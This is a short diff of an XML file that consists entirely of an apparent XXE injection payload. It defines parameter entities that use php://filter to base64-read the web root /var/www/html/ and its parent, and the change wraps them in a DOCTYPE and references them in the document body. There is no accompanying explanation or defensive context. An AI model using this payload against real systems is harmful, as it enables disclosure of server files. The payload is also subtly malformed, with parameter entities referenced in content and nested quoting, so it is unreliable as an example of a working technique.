@@ -1,5 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/">
-<!ENTITY % dir SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/..">
-<!ENTITY % payload "<!ENTITY % list '%file;%dir;'>">
-%payload;
+<!DOCTYPE data [
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/">
+    <!ENTITY % dir SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/..">
+    <!ENTITY % payload "<!ENTITY % list '%file;%dir;'>">
+]>
+<data>
+    %file;
+    %dir;
+    %payload;
+</data>
